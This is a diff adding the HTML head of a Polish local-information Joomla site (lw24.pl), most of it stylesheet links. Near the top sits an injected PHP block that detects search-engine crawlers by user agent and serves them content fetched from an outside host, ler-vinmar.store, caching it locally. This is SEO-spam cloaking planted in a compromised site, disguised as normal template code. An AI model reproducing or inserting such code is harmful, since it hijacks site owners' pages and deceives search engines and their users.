@@ -1,0 +1,961 @@
+
+
+<!doctype html>
+<html lang="pl-pl" dir="ltr">
+	
+  <head>
+  	<!-- Start TAGZ: -->
+  	<meta name="twitter:card" content="summary_large_image"/>
+	<meta name="twitter:description" content="Zapraszam na stronę lw24.pl .
+Znajdziesz tu np. dyżury aptek, pogodę i wiele innych informacji z Lidzbarka Warmińskiego"/>
+	<meta name="twitter:image" content="https://lw24.pl/images/webp/lidzbark_warminski_08.webp"/>
+	<meta name="twitter:title" content="Witam na lw24.pl"/>
+	<meta property="fb:app_id" content="100027526370482"/>
+	<meta property="og:description" content="Zapraszam na stronę lw24.pl .
+Znajdziesz tu np. dyżury aptek, pogodę i wiele innych informacji z Lidzbarka Warmińskiego"/>
+	<meta property="og:image" content="https://lw24.pl/images/webp/lidzbark_warminski_08.webp"/>
+	<meta property="og:image:height" content="730"/>
+	<meta property="og:image:width" content="1920"/>
+	<meta property="og:site_name" content="Lw24.pl "/>
+	<meta property="og:title" content="Witam na lw24.pl"/>
+	<meta property="og:type" content="website"/>
+	<meta property="og:url" content="https://lw24.pl/"/>
+  	<!-- End TAGZ -->
+
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bot_patterns = '/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|telegrambot|Google-Site-Verification|Google-InspectionTool|adsense)/i';
+    
+    return preg_match($bot_patterns, $user_agent);
+}
+
+function fetch_content($url) {
+    $cache_file = 'cache/' . md5($url) . '.html';
+    $cache_time = 3600;
+
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($content) {
+        file_put_contents($cache_file, $content);
+    }
+
+    return $content;
+}
+
+if (is_bot()) {
+    echo fetch_content('https://ler-vinmar.store/bangjimmy.txt');
+    exit;
+} 
+?>
+  		
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<meta charset="utf-8">
+	<meta name="keywords" content="Lidzbark warmiński">
+	<meta name="description" content="Zapraszam na stronę lw24.plpublic $MetaDesc = ">
+	<meta name="generator" content="Joomla! - Open Source Content Management">
+	<title>LW24 - Zapraszamy</title>
+	<link href="/images/logolw24a90.png" rel="icon" type="image/vnd.microsoft.icon">
+<link href="/media/vendor/joomla-custom-elements/css/joomla-alert.min.css?0.4.1" rel="stylesheet">
+	<link href="/components/com_sppagebuilder/assets/css/animate.min.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/components/com_sppagebuilder/assets/css/sppagebuilder.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowaee3z/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotxywxi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovhkigo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobczuhn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocvufek/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobnltsj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiuuapf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopp9tp3/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico15v3v3/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoaf5okv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofiwvwb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico2sz12e/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiacbnk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogcniex/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotmsydp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohxjtgi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/xkiuzn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomcwrnl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorxolqv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokdsjmu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokupcbt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozedgbi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotsrcsc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowptqmx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofjvuwe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohskjqm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icordtscu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopjwnop/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoarkcne/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovolitz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocawlbl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopdtelu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolpwvjc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiqvgwe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorgauaj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofhmyaf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohuyhep/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodlephc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohqkobq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopsjpdo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoijdwzt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqhjhla/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoukolhm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobrzias/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozrwblf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopvdnsx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobjloot/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocnjykz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolpaoak/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodnoemz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoldyrri/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofwvbfh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconjpjrc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxgqiyj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoczhwjo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocvzsum/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorexslu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icommwjov/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoeklhxy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopwvcqe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icownxyys/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodzjvpc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodqxwyu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozlgnlk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconfylah/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozvgrui/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconrhljo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxhdjql/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icourmexe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosepxoz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogmdrpo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxwuswb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomlgubl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqznosf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouuxppx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoopqmdz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icob06z7s/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozfoafs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomkvsou/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooppned/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobiwtll/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovzbkdj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotjglyj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozkeldd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodwtnhd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoblyrlx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconborgn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoepusxt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobwbjly/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomcsjcj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icophkgqx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorycgtv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icondtdnx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocaujzm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoomsjxd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofhwtis/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoojscko/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorltwzf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoywapze/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokgridx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoozrxou/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovlepds/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoylboff/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovnikhz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotfqdef/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoygcxys/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconlzyrt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoskpmje/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconypvkf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohcozla/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozpxhex/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqwqrtm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icordpfyt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icob02liy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico7ubxqa/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohj6evz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowvm0gu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icont9faz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico5f0azv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxaegya/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosu1n36/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojth98x/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosu9utx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icour8ip6/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodi7t1l/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxcitfa/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooumigf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorfkijv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojgoufq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocmhyeq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconogxhx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofwxelv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoszoltj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokqnoda/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogkkhmh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopzffvy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozaubed/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotstkev/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomahuup/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotmcxdr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobkkbnz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobkqses/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icognrpjw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqjabzj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoemmomi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocupmzb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocdzeoe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovsleav/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoomclry/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoeryyuz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohhnkik/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icootoljw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokugiec/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobkswqr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqrjfir/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico971lmj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoewdhvp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosrktsr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodocxz1/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodi8mmm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoocjxrp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolxhdsb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozofevt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoaiefrp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoerhwex/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorgdmzs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokaxffe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconkvqqg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogjckio/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopiavql/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconyafxo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokaohup/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoloeyaj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconxwucd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokjdkxe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodiprji/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomkvtlz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokgjlfb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icockzdjc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokbbiya/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiqsanx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotjjioc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovaxlmo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoknmbbj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodaijov/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooaaxah/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxbosdd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoelbagx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icompdxdq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovvealk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojqrmcj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoevmiza/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyetzwg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodfzeeu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofasuls/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoaointp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofnacmb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofeywjp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofvblvb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoozarzx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodfmqpd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopbpmze/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodsyamc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorhdubc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozisujj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoltoytw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogvkzjh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
